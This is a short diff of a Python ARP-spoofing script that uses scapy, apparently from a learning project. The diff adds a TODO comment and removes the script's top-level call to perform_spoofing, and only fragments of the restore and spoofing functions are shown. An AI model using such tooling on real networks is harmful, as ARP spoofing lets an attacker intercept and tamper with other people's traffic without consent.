@@ -50,6 +50,7 @@ def restore(destination_ip, source_ip):
     scapy.send(packet, count=4, verbose=False)
 
 
+# TODO: Separate it somehow to have the ability to stop spoofing.
 def perform_spoofing(target_ip, gateway_ip):
     sent_packets_count = 0
     try:
@@ -63,8 +64,3 @@ def perform_spoofing(target_ip, gateway_ip):
         print("\n[+] Execution aborted. Restoring ARP tables...")
         restore(target_ip, gateway_ip)
         restore(gateway_ip, target_ip)
-
-
-args = get_arguments()
-target, gateway = args.target, args.gateway
-perform_spoofing(target, gateway)
